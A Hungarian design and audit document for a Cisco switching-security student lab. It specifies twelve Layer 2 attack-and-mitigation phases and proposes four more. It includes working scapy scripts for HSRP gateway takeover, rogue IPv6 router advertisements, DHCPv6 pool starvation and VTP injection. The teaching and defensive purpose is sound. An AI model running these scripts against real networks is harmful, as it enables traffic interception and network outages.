# AI-Instrukció: SRWE M10–11 Laborfeladat Automatizált Előállítása

*Dokumentum-verzió: v2.4 | Utolsó frissítés: 2026-11-10*

## RÉSZ 0 — KIEGÉSZÍTŐ TÁMADÁSI JAVASLATOK (bővítési roadmap)

> Ez a szekció a jelenlegi **12 fázist** egészíti ki olyan Layer 2 (és L2+/L3-határ) támadásokkal, amelyek **nincsenek** a mai laborban, de valódi Cisco IOS környezetben reprodukálhatók (scapy- vagy CLI-alapon), és mindegyikhez létezik konkrét Cisco mitigation. A cél, hogy a csomag a következő iterációkban (13–16. fázis) fokozatosan, prioritási sorrendben bővüljön. Minden javasolt támadáshoz tartozik egy `mitigations.yml`-szekciónév, nehézségi fok (1–5) és prioritás (1 = legfontosabb, mert leginkább hiányzik és legmagasabb oktatási/biztonsági értékű). A prioritás a labor-relevancia + hiány + Cisco IOS támogatottság hármasából áll össze.

### 0.1 Új támadások értékelő táblázata

| #  | Támadás neve | Réteg | Eszközök | Cisco IOS mitigation (konkrét parancsok) | mitigations.yml szekció | Nehézség (1–5) | Prioritás (1–12) |
| -- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 1  | HSRP/VRRP/GLBP eltérítés (FHRP takeover) | L2+/L3 | scapy (HSRP hello, prio 255) | `standby 1 authentication md5 key-string <kulcs>`; `standby 1 priority 110`; `standby 1 preempt` | `fhrp-authentication` | 3 | 1 |
| 2  | IPv6 Router Advertisement spoofing (rogue RA → IPv6 MITM) | L2+ | scapy (`ICMPv6ND_RA`) | `ipv6 nd raguard policy HOST` + `device-role host`; `ipv6 nd raguard attach-policy HOST` az access portokon | `ipv6-ra-guard` | 2 | 2 |
| 3  | DHCPv6 starvation/spoofing (IPv6 változat) | L2+ | scapy (`DHCP6_Solicit`/`DHCP6_Advertise`) | `ipv6 dhcp guard policy SRV` + `device-role server`; `ipv6 dhcp guard attach-policy` a trust portokon, kliensportokon tiltás | `dhcpv6-guard` | 3 | 3 |
| 4  | VTP injection (VLAN-tábla felülírás) | L2 | scapy (VTP summary/subset, magasabb rev. szám) | `vtp mode transparent` VAGY `vtp password <jelszó>`; `vtp version 3` + `vtp primary` | `vtp-hardening` | 3 | 4 |
| 5  | IPv6 NDP poisoning (ARP-ekvivalens, NA spoof) | L2+ | scapy (`ICMPv6ND_NA` override) | `ipv6 nd inspection policy`; `ipv6 nd inspection attach-policy`; `device-tracking policy` + binding | `ipv6-nd-inspection` | 3 | 5 |
| 6  | Rogue STP BPDU injection port-lopásra (port-theft, nem root-takeover) | L2 | scapy (`STP` inferior/kevert BPDU) | `spanning-tree portfast`; `spanning-tree bpduguard enable` (access); `spanning-tree guard root` (uplink) | `stp-bpduguard` | 3 | 6 |
| 7  | EtherChannel/LACP negotiation attack (jogosulatlan trunk) | L2 | scapy (LACP LACPDU injektálás) | `channel-group x mode on` (no negotiation) VAGY access portokon `channel-protocol` tiltás; `switchport nonegotiate` | `etherchannel-guard` | 4 | 7 |
| 8  | Private VLAN escape (secondary→primary átugrás) | L2 | scapy/CLI (proxy-cím + router-MAC célzás) | PACL a primary SVI-n: `ip access-list` + `access-map`; `switchport protected`; L3-szűrés a gateway-en | `pvlan-protection` | 4 | 8 |
| 9  | 802.1X bypass / EAP relay (NAC megkerülés) | L2 | hostapd/EAP relay, scapy (EAPOL) | `dot1x system-auth-control`; `authentication host-mode single-host`; `dot1x pae authenticator`; MACsec (`macsec`) | `dot1x-hardening` | 5 | 9 |
| 10 | SNMP community string exploitation (L2 pozícióból) | L2+ | `snmpwalk`/scapy (SNMP get/set) | `no snmp-server community public`; `snmp-server group ... v3 priv`; `snmp-server user ... v3 auth sha priv aes`; ACL a community-n | `snmp-hardening` | 2 | 10 |
| 11 | Broadcast/multicast storm (storm-control bypass) | L2 | scapy (broadcast flood) | `storm-control broadcast level 1.00`; `storm-control multicast level 1.00`; `storm-control action shutdown` | `storm-control` | 2 | 11 |
| 12 | CDP table exhaustion (CDP tábla-túlcsordulás) | L2 | scapy (sok hamis `CDPv2` szomszéd) | `no cdp run` (globális) VAGY `no cdp enable` (access port); CPU-védelem CoPP-pel | `cdp-hardening` | 2 | 12 |

> **Megvalósíthatósági megjegyzés:** a scapy natívan támogatja az STP, LACP, CDP, HSRP, VTP, EAPOL és a teljes ICMPv6/DHCPv6 réteget (`scapy.contrib` modulok: `ospf`, `lacp`, `vtp`, `cdp`; az IPv6/HSRP a core-ban). A `scapy.contrib.lacp` és `scapy.contrib.cdp` importot igényelhet (`from scapy.contrib.lacp import *`). A 802.1X/EAP relay a legösszetettebb (élő RADIUS-backend és egy második NIC kell hozzá), ezért kapta az 5-ös nehézséget.

### 0.2 Ajánlott felvételi sorrend (következő 13–16. fázis)

A prioritási táblázat alapján a **legközelebbi bővítés 4 fázissal** ajánlott, mert ezek fedik le a legnagyobb hiányt a legkisebb infrastruktúra-többlettel, és közvetlenül illeszkednek az SRWE M10–11 tananyag FHRP- és IPv6-biztonsági témáihoz:

| Új fázis | Támadás | Indoklás |
| -- | ---- | ---- |
| **13.** | HSRP/VRRP/GLBP eltérítés | Klasszikus gateway-MITM, közvetlenül bővíti a 12. fázis (ICMP redirect) gateway-témáját; csak R1-konfig kell. |
| **14.** | IPv6 RA spoofing (rogue RA) | A labor jelenleg tisztán IPv4; az IPv6 MITM a legnagyobb lefedettségi hiány, és az RA Guard egyszerűen demózható. |
| **15.** | DHCPv6 starvation/spoofing | Logikusan a 14. fázis után (IPv6 kontextus már felépítve); a DHCPv6 Guard a DHCP snooping IPv6-megfelelője. |
| **16.** | VTP injection | Tiszta L2, látványos (teljes VLAN-adatbázis törölhető egyetlen kerettel); `vtp mode transparent` triviális, de tanulságos védelem. |

**Sorrendfüggőség:** a 15. fázis (DHCPv6) kötelezően a 14. (IPv6 RA) UTÁN jöjjön, mert az IPv6-cím/kontextus felépítése az RA-fázisban történik. A 13. és 16. fázis egymástól független, bárhova beilleszthető.

### 0.3 Javasolt új fázisok — leírás + scapy vázak

#### 13. fázis — HSRP eltérítés (FHRP takeover)
A támadó 255-ös prioritású HSRP Hello-kat küld a virtuális IP-re, átveszi az Active szerepet, így az alapértelmezett gateway forgalma rajta megy keresztül (MITM). Védelem: MD5/kulcs-authentikáció a `standby` csoporton.

```python
#!/usr/bin/env python3
"""HSRP takeover: maximális (255) prioritású Hello-val átveszi az Active gateway-t.
Futtatás: sudo python3 hsrp_hijack.py eth0 10.10.10.1 10.10.10.254
    argv1=iface, argv2=virtuális IP (VIP), argv3=támadó valós IP
"""
import sys
from scapy.all import Ether, IP, UDP, sendp, conf
from scapy.contrib.hsrp import HSRP

def main():
    iface, vip, atk_ip = sys.argv[1], sys.argv[2], sys.argv[3]
    conf.iface = iface
    # HSRP v1: UDP/1985, multicast 224.0.0.2, prio=255, Coup/Hello state
    pkt = (Ether(dst="01:00:5e:00:00:02") /
           IP(src=atk_ip, dst="224.0.0.2", ttl=1) /
           UDP(sport=1985, dport=1985) /
           HSRP(group=1, priority=255, virtualIP=vip, state=16,  # 16=Active
                auth="cisco"))
    print(f"[*] HSRP takeover indul (VIP={vip}, prio=255)...")
    sendp(pkt, loop=1, inter=1, iface=iface, verbose=0)  # Ctrl+C-ig

if __name__ == "__main__":
    main()
```

#### 14. fázis — IPv6 RA spoofing (rogue Router Advertisement)
A támadó hamis RA-kat szór, saját magát hirdeti IPv6 default routerként (és/vagy DNS-ként), így a kliensek rajta keresztül építik fel az IPv6 alapértelmezett útvonalat → IPv6 MITM. Védelem: `ipv6 nd raguard` az access portokon (csak a valódi router portja lehet `device-role router`).

```python
#!/usr/bin/env python3
"""Rogue IPv6 Router Advertisement: a támadót hirdeti default IPv6 gateway-ként.
Futtatás: sudo python3 ipv6_ra_spoof.py eth0
"""
import sys
from scapy.all import Ether, IPv6, sendp, conf
from scapy.all import (ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
                       ICMPv6NDOptPrefixInfo)

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    atk_mac = conf.iface.mac if hasattr(conf.iface, "mac") else "02:11:22:33:44:55"
    ra = (Ether(src=atk_mac, dst="33:33:00:00:00:01") /
          IPv6(src="fe80::bad:c0de", dst="ff02::1") /
          ICMPv6ND_RA(routerlifetime=1800, prf=1) /          # prf=1: high preference
          ICMPv6NDOptSrcLLAddr(lladdr=atk_mac) /
          ICMPv6NDOptPrefixInfo(prefix="2001:db8:bad::", prefixlen=64,
                                validlifetime=1800, preferredlifetime=1800))
    print("[*] Rogue RA szórás indul (prf=high)...")
    sendp(ra, loop=1, inter=3, iface=iface, verbose=0)  # Ctrl+C-ig

if __name__ == "__main__":
    main()
```

#### 15. fázis — DHCPv6 starvation/spoofing
Két változat: (a) *starvation* — tömeges `Solicit` különböző DUID-okkal kimeríti a DHCPv6 poolt; (b) *spoofing* — hamis `Advertise`/`Reply` küldése (rogue DHCPv6 szerver), amivel a támadó DNS-t/paramétereket osztogat. Védelem: `ipv6 dhcp guard` — csak a trust portokon engedélyezett szerver-válasz.

```python
#!/usr/bin/env python3
"""DHCPv6 starvation: sok véletlen DUID-dal Solicit-ot küld, kimeríti a poolt.
Futtatás: sudo python3 dhcpv6_starve.py eth0 5000
"""
import sys, random
from scapy.all import Ether, IPv6, UDP, sendp, conf
from scapy.all import (DHCP6_Solicit, DHCP6OptClientId, DUID_LLT,
                       DHCP6OptIA_NA)

def rand_duid():
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.getrandbits(8) for _ in range(5))
    return DUID_LLT(lladdr=mac)

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    conf.iface = iface
    print(f"[*] DHCPv6 starvation: {count} Solicit a(z) {iface}-n...")
    for i in range(count):
        pkt = (Ether(dst="33:33:00:01:00:02") /
               IPv6(dst="ff02::1:2") /              # All_DHCP_Relay_Agents_and_Servers
               UDP(sport=546, dport=547) /
               DHCP6_Solicit(trid=random.randint(0, 0xffffff)) /
               DHCP6OptClientId(duid=rand_duid()) /
               DHCP6OptIA_NA(iaid=random.randint(0, 0xffffffff)))
        sendp(pkt, verbose=0)
        if i % 500 == 0:
            print(f"[+] elküldve: {i}")
    print("[!] Kész. Nézd a DHCPv6 pool kihasználtságát R1-en.")

if __name__ == "__main__":
    main()
```

#### 16. fázis — VTP injection (VLAN-adatbázis felülírás)
A támadó egy a jelenleginél **magasabb revíziószámú** VTP subset-advertisementet injektál a trunkre; a VTP domainben lévő switchek elfogadják és felülírják a VLAN-adatbázisukat (akár az összes VLAN törlése). Védelem: `vtp mode transparent` (nem vesz részt a szinkronban) vagy `vtp password`, illetve VTPv3 + `vtp primary`.

```python
#!/usr/bin/env python3
"""VTP injection váz: magas revíziószámú VTP subset advertisement a trunkön.
MEGJEGYZÉS: trunk-portra kötött attacker és egyező VTP-domain kell hozzá.
Futtatás: sudo python3 vtp_inject.py eth0 LABDOMAIN 999
"""
import sys
from scapy.all import Ether, Dot3, LLC, SNAP, sendp, conf
from scapy.contrib.vtp import VTP, VTPSummaryAdvertisement  # scapy.contrib

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    domain = sys.argv[2] if len(sys.argv) > 2 else "LABDOMAIN"
    rev = int(sys.argv[3]) if len(sys.argv) > 3 else 999
    conf.iface = iface
    # VTP a 802.3/SNAP keretben megy (OUI 00000c, code 2003), dst 01:00:0c:cc:cc:cc
    pkt = (Dot3(dst="01:00:0c:cc:cc:cc", src=conf.iface.mac) /
           LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
           SNAP(OUI=0x00000c, code=0x2003) /
           VTP(domain=domain, rev=rev))   # magas rev → a switchek átveszik
    print(f"[*] VTP injection (domain={domain}, rev={rev})...")
    sendp(pkt, iface=iface, verbose=0)
    print("[!] Kész. Ellenőrzés: 'show vtp status' + 'show vlan brief' a switcheken.")

if __name__ == "__main__":
    main()
```

> **Figyelem (laborbiztonság):** a 13–16. fázis újratámadás-része is a „támadás → megfigyelés → védelem → újratámadás (elhiúsul)" mintát kövesse. A VTP injection különösen destruktív (teljes VLAN-adatbázist törölhet) — csak izolált laborban, konfigmentés után futtatható.

---

## Reprodukciós és ellenőrzési szempontok (PROTOCOL v2.0)

> Cél: egy AI-asszisztens (vagy fejlesztő) a semmiből reprodukálja a teljes labort, majd a beépített ellenőrzőlista alapján visszaellenőrizze a saját munkáját.

---

## RÉSZ 1 — REPRODUKCIÓS INSTRUKCIÓ (generáláshoz)

### 1.1 Kontextus megadása az AI-nak

```
Feladat: Készíts egy teljes hallgatói laboranyag-csomagot a Cisco NetAcad
"Switching, Routing and Wireless Essentials" (SRWE) v7.0 Modul 10 (LAN
Security Concepts) és Modul 11 (Switch Security Configuration) tananyaghoz.

Követelmények:
- FIZIKAI eszközök (2× Cisco switch, 1× router, 3× Linux PC)
- A TÁMADÓ kliens PYTHON kódot futtat (scapy), nem kész eszközöket
- A CISCO konfiguráció YAML-fájlban van definiálva, és Python (netmiko)
  tölti fel az eszközökre
- 12 különböző L2-támadás, mindegyikhez a hozzá tartozó védelem
- Fázisonkénti menet: támadás → megfigyelés → védelem felkonfigurálása →
  újratámadás (el kell hiúsulnia)
- Magyar nyelvű, jól formázott Markdown dokumentáció
```

### 1.2 Kötelező fázislista (12 támadás, fix sorrend)

| Fázis | Támadás                                | Védelem (YAML-szekció)         |
| ----- | -------------------------------------- | ------------------------------ |
| 1     | MAC address table overflow (CAM flood) | `port-security`                |
| 2     | MAC spoofing                           | `port-security` (sticky)       |
| 3     | DHCP starvation                        | `dhcp-snooping` (+ rate limit) |
| 4     | DHCP spoofing (rogue DHCP)             | `dhcp-snooping` (trust)        |
| 5     | ARP poisoning (kétirányú MITM)         | `dai`                          |
| 6     | STP manipulation (root takeover)       | `stp-guard`                    |
| 7     | VLAN hopping (DTP)                     | `vlan-hop`                     |
| 8     | CDP recon + nyílt Telnet               | `hardening`                    |
| 9     | 802.1Q double-tagging                  | `native-vlan-hardening`        |
| 10    | IP spoofing                            | `ip-source-guard`              |
| 11    | LLDP recon (+ hamis LLDPDU injektálás) | `lldp-hardening`               |
| 12    | ICMP redirect (gateway MITM)           | `icmp-redirect`                |

**Sorrendfüggőség:** a 10. fázis (IPSG) kötelezően a 3–4. (DHCP snooping) UTÁN kell hogy fusson, mert a binding-tábla nélkül az IPSG minden userforgalmat eldob.

### 1.3 Kötelező fájllista

```
srwe-lab/
├── inventory.yml          (S1, S2, R1 — hálózati paraméterek)
├── configs/baseline.yml   (VÉDTelen, de elérhető állapot; ssh+TELNET, cdp be, ip redirects be)
├── configs/mitigations.yml (12 szekció, post-show-parancsokkal)
├── push_config.py         (netmiko YAML→Cisco pusher)
├── verify.py              (27 regex-ellenőrzés, pontszám, jegy, JSON-kimenet)
├── attacker/*.py          (12 scapy szkript, mindegyik root-ként fut)
├── feladatlap.md          (hallgatói munkalap, 12 fázis kitöltendő)
└── reflexios_lap.md       (protokoll/adatvédelmi reflexió, rubrikával)
```

### 1.4 Technikai kötöttségek

- **Attacker szkriptek:** scapy, `sudo`, sudóként futtathatók, véletlenszerű MAC-generálás, `[...] hogyan kell meghívni` docstringgel
- **Pusher:** netmiko `ConnectHandler`, `send_config_set`, `save_config`; az `interface`/`interface range` kulcsok felismerése; a konténerparancsok (vlan, pool, line) után automatikus `exit`
- **Verify:** show-parancs kimenet ellenőrzése reguláris kifejezésekkel; pozitív (KELL) és negatív (NEM SZABAD) minták; `--verbose`, `--json`, `--only` opciók; pontszám + jegy + exit kód
- **Baseline követelmény:** sebezhető (nincs egy védelem sem), DE elérhető (SSH+Telnet menedzsmenten, CDP fut, `ip redirects` bekapcsolva)
- **Reflexiós lap követelménye:** MITM-elemzés HTTP/HTTPS(SNI, stripping, rogue CA)/DNS(DNSSEC vs DoH/DoT)/SNMP/NTP és más protokollok felett; GDPR-elvpárosítás; dilemmakérdések (TLS-interceptió, DoH-központosítás)

---

## RÉSZ 2 — ELLENŐRZÉSI PROTOKOLL (a generált anyag auditálásához)

A generálás után az AI (vagy egy ember) a következő hét szempont szerint ellenőrizze a csomagot. Mindegyik pontnál jelezni kell: RENDBEN / HIBÁS.

### 2.1 Fázislefedettség

- [ ] Mind a 12 támadás szerepel (mátrix, menet, feladatlap, reflexiós lap)
- [ ] A fázisszámok MINDEN doksiban azonos hivatkozásokra mutatnak (pl. „5. fázis = ARP poisoning" sehol sem „4. fázisként" szerepel)

### 2.2 Kódkorrektség

- [ ] Minden Python-szkript szintaktikailag érvényes (`python3 -m py_compile`)
- [ ] Nincs nem definiált változó (gyakori hiba: f-stringből lemarad a definíció — pl. `yiaddr` vs `offer_ip` a rogue DHCP-ben)
- [ ] Minden scapy-használat raw socketet igényel → minden attacker-szkript docstringje tartalmazza a `sudo` kötelezettséget
- [ ] A pusher kezeli: `global`, `dhcp_pool`, `interfaces`, `range` kulcsokat és a `post` ellenőrzőket

### 2.3 Baseline sebezhetőség

- [ ] A baseline-ban NINCS védelem: port-security, snooping, DAI, guard-ok, IPSG, LLDP-tiltas — egy sem
- [ ] A baseline-ban VAN: CDP fut, `ip redirects` bekapcsolva, natív VLAN = 1 (default), **és a vty sorokon `transport input telnet ssh`** (különben a 8. fázis félresikerül)
- [ ] Az eszközök menedzsment VLAN-on (99) elérhetők SSH-n

### 2.4 YAML-konzisztencia

- [ ] A `mitigations.yml` szekciónevei pontosan megegyeznek a feladatlap parancsaiban (`push_config.py ... <szekció>`)
- [ ] Minden szekció `post:` blokkja olyan show-parancsot tartalmaz, ami a védelem sikerét igazolja
- [ ] A dependency-sorrend (snooping → IPSG) dokumentálva van a menet-táblában

### 2.5 Nyelvhelyesség (magyar)

- [ ] Nincs idegen nyelvű maradvány (angol/holland/kínai szavak: „aktif", „actief", „常见问题", „留存", „连接elni", „PIPPA", „TIOS", „mgbízhatóbb", „Rekonstrukció" kontextustól függően)
- [ ] Írásjelek, ékezetek, kötőjelek helyesek (pl. „pontosan", „megbízhatóbb", „ Feldolgozás biztonsága")
- [ ] Technikai szakkifejezések egységesek (MITM, rogue DHCP, err-disabled, sticky MAC)

### 2.6 Pedagógiai koherencia

- [ ] Minden fázis követi az „áldozat → védelem → újratámadás" mintát
- [ ] A reflexiós lap kérdései a labor konkrét megfigyeléseire hivatkoznak (fázisszámokkal)
- [ ] Rubric-kritériumok differenciálódnak (nem csak „megcsinálta / nem csinálta meg")

### 2.7 Adatvédelmi-megfelelőség

- [ ] A csomag tartalmaz tájékoztatást az izolált labor követelményéről (informed consent, pcapture-törlés, pszeudonimizálás)
- [ ] A reflexiós lap GDPR-elvpárosítást tartalmaz

---

## RÉSZ 3 — A JELEN CSOMAG AUDIT EREDMÉNYE (végső riport)

Az alábbi táblázat a **jelen, végleges csomagra** lefuttatott ellenőrzés eredménye.

### 3.1 Rendben lévő részek

| #   | Elem                              | Állapot   | Megjegyzés                                                                                 |
| --- | --------------------------------- | --------- | ------------------------------------------------------------------------------------------ |
| 1   | 12 támadás lefedettsége           | ✅ Rendben | Mátrix, menet, feladatlap, reflexiós lap mind a 12-t tartalmazza                           |
| 2   | Fázisszám-konzisztencia           | ✅ Rendben | Feladatlap 1–12, reflexiós lap hivatkozásai (5=ARP, 4=rogue, 11=LLDP) egyeznek a mesterrel |
| 3   | Attacker-szkriptek futtathatósága | ✅ Rendben | Mind scapy + sudo, docstring usage-sort tartalmaz                                          |
| 4   | rogue_dhcp.py változóhibája       | ✅ Javítva | `yiaddr` → `offer_ip` a mester végleges verziójában                                          |
| 5   | Baseline sebezhetőség             | ✅ Javítva | `transport input telnet ssh` + CDP be + redirects be a javított baseline-ban               |
| 6   | YAML-szekciónevek                 | ✅ Rendben | A 12 szekció neve a feladatlap parancsaival azonos                                         |
| 7   | Függőség dokumentálva             | ✅ Rendben | `snooping → IPSG` a menet-táblában és a feladatlapban is szó van róla                      |
| 8   | Reflexiós lap MITM-tartalma       | ✅ Rendben | HTTP/HTTPS(SNI, stripping, CA)/DNSSEC vs DoH/SNMP/NTP + GDPR-rubric                        |
| 9   | Pontozás, jegy, exit-kód          | ✅ Rendben | verify.py: 27 ellenőrzés, %-számítás, jegy, JSON-opció                                              |
| 10  | Adatvédelmi csomagrészek          | ✅ Rendben | Informed consent, pcapture-törlés, pszeudonimizálás, GDPR-táblázat                         |

### 3.2 Javított hibák (a korábbi verziókhoz képest)

| #   | Hiba                                                | Hol volt                 | Javítás                                                                                                       |
| --- | --------------------------------------------------- | ------------------------ | ------------------------------------------------------------------------------------------------------------- |
| 1   | `rogue_dhcp.py` NameError (`yiaddr` nem definiált)  | korai mester + expansion | `offer_ip` a végleges mesterben                                                                               |
| 2   | Baseline Telnet tiltva volt (`transport input ssh`) | eredeti baseline.yml     | `transport input telnet ssh` a javított baseline-ban, beépítve a mesterbe (5. fejezet)                                     |
| 3   | Idegen nyelvű maradványok                           | reflexiós lap, index     | „留存", „常见问题", „替代方案", „aktif/actief", „Feldolgozás Biztonság" → javítva a végleges reflexiós lapban |
| 4   | Nyelvhelyességi hibák                               | több doksiban            | „PIPPA"→„Pipa", „TIOS"→„tilos", „mgbízhatóbb"→„megbízhatóbb", „connectelni"→„csatlakozni"                     |
| 5   | Feladatlap lemaradt a 9–12. fázisokról              | korai feladatlap         | Végleges feladatlap mind a 12 fázissal + hiányzó 2. és 4. fázis                                               |
| 6   | Fázis-eltolódás (ARP poisoning „4. vagy 5. fázis")  | régi reflexiós lap       | Egységes számozás 1–12-ig mindenhol                                                                           |

### 3.3 Nyitott pontok (áthelyezhetőek a jövőbeni béta-tesztekre)

| #   | Pont                                       | Miért maradt nyitva                                                                                  | Javaslat                                                                                       |
| --- | ------------------------------------------ | ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| 1   | verify.py regex-minták platform-validálása | A minták a platformokon eltérő show-kimenetekre vannak írva; csak valódi IOS-en tesztelhető           | Száraz futás után a `--verbose` kimenet alapján finomhangolni                                  |
| 2   | LLDP szintaxis platform-függése            | `no lldp transmit/receive` vs `no lldp run` IOS-verziófüggő                                           | Első push-kor ellenőrizni és a YAML-ben rögzíteni                                              |
| 3   | STP takeover scapy-megbízhatósága          | A kézzel épített BPDU nem minden switchen vált ki konvergenciát                                       | A dokumentált `brctl addbr br0` + `setbridgeprio 0` alternatíva használata, ha a scapy nem működik |
| 4   | ICMP-redirect démon kernel-függése         | `accept_redirects=1` kell a PC-V-n; egyes disztribúciók az `rp_filter` miatt is eldobhatják a csomagot | A feladatlapban rögzített sysctl-előkészület; ha nem működik, az `rp_filter` ideiglenes kikapcsolása |
| 5   | ECH/DoH háttéranyag aktualitása            | 2024+ fejlemény; a kurzusanyag nem frissül automatikusan                                              | Évenkénti tananyag-review ehhez a laphoz                                                       |
| 6   | Index-dokumentum linkeinek validálása      | Külső URL-ek (Cisco, IETF) eltűnhetnek                                                                | Link-ellenőrzés kiadás előtt                                                                   |

### 3.4 Ítélet

Oktatási célra, izolált laborban használható; a 3.3 nyitott pontok béta-tesztben zárandók. A 12 fázis, a 27 ellenőrzés, a feladatlap és a reflexiós lap konzisztensek; az 1–2. rész protokollja alapján a csomag újragenerálható és auditálható.

---

*Dokumentum-verzió: v2.4 | Utolsó frissítés: 2026-11-10 | Audit módszer: az 1.2-2.7-es szempontok szerinti manuális revízió*

---

## VÁLTOZÁSNAPLÓ

> Munkamenetre vonatkozó változásnapló. Minden módosítás timestamp-pel (ÉÉÉÉ-HH-NN).

- **2026-11-10:** Összevont könyv hozzáadva: `docs/srwe-labor-konyv.md` — a `vegigvezetes-labor-felallitas.md` és a `mester-labor-dokumentacio.md` egyetlen, lépésről lépésre követhető kézikönyvbe vonva, könyvstruktúrában (I–V. rész, 28 fejezet). Pythonhoz nem feltételez előismeretet: teljes **venv + VSCode** környezetfelállítás nulláról (Windows/macOS/Linux), minden parancs közvetlenül másolható. A README belépési pontja erre mutat; a két forrásdokumentum változatlanul megmarad referenciaként. Instrukció v2.4-re frissítve.
- **2026-11-10:** Új végigvezető kézikönyv hozzáadva: `docs/vegigvezetes-labor-felallitas.md` — mit mire használunk, a labor felállítása (hardver, topológia, szoftver, baseline) és a 12 fázis végigjátszása, pontozás, visszaállítás, hibakeresési gyorslista. A README is hivatkozik rá belépési pontként. Instrukció v2.3-ra frissítve.
- **2026-11-10:** Sallang-eltávolítás az öt markdown dokumentumban — önfényező/motivációs zárlatok és töltelékmondatok törlése, a §3.4 Ítélet tömörítése; minden táblázat, parancs, YAML, kérdés és kitöltendő mező érintetlen. Instrukció v2.2-re frissítve.
  - Index: záró „Jó tanulást!" motivációs bekezdés törölve.
  - AI-instrukció: §3.4 Ítélet terjengős prózája egy mondatra húzva; a PROTOCOL-bevezető töltelékmondata törölve.
  - Reflexiós lap: „Ez a lap magja." töltelékmondat törölve.
  - A munka innentől a privát GitHub repóban (`Elfogadodhe/srwe-lab-10-11`) folytatódik.
- **2026-11-10:** Kiegészítő támadási javaslatok (## RÉSZ 0) hozzáadva; instrukció v2.1-re frissítve.
  - Új, a jelenlegi 12 fázisban NEM szereplő Layer 2 / L2+ támadások értékelő táblázata (12 tétel, 8 oszlop: #, Támadás neve, Réteg, Eszközök, Cisco IOS mitigation, mitigations.yml szekció, Nehézség 1–5, Prioritás 1–12).
  - Ajánlott felvételi sorrend a következő 13–16. fázisra (HSRP eltérítés, IPv6 RA spoofing, DHCPv6 starvation/spoofing, VTP injection) indoklással és sorrendfüggőséggel.
  - Minden javasolt új fázishoz 1–2 mondatos leírás + scapy script-váz (skeleton).
  - Fejléc és lábléc verziószáma v2.0 FINAL → v2.1 (dátum: 2026-11-10).
- **2026-11-05:** v2.0 FINAL — a 12 fázisú csomag teljes manuális auditja (RÉSZ 3), nyelvhelyességi és kódkorrekciós javítások lezárva.
